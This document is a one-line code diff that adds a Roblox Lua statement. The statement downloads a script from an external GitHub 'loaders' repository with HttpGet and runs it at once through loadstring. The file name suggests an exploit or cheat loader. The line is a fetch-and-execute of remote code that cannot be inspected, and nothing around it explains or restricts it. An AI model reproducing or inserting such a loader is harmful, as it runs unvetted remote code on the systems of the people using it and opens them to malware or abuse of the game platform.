@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/hide-in-pixels-spam0-2vzozn76jqpvgb.lua"))()
